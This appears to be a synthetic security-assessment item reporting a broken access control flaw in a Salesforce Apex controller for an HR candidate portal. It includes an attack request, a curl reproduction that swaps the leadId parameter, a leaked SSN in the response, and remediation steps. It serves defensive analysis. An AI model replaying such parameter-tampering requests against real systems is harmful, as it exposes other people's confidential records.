# Security Analysis Report
**System:** JobCore Candidate Portal (Salesforce-Integrated)
**Domain:** HR Tech / Talent Acquisition
**Example ID:** SF-0109
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `LeadController.getLeadData` — attacker reads any HR/talent acquisition Lead record by substituting `leadId` |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Lead Object (Pattern 2.4)

### Summary
The Apex controller `LeadController` on JobCore Candidate Portal (`d5202e03.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 2.4, an attacker with a valid Salesforce session tampers with the `leadId` parameter in the Aura framework request to escalate their access and read HR/talent acquisition Lead records owned by other users, including candidate SSN and confidential hiring notes.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` but the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://d5202e03.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://d5202e03.lightning.force.com/aura
Authorization: Bearer 00DD5202E03!ARd5202e03...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DD5202E03!ARd5202e03...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"0012E03","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0012E03", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-70-2419"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DD5202E03!ARd5202e03..."
curl -s -X POST "https://d5202e03.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"0012E03","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-70-2419
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
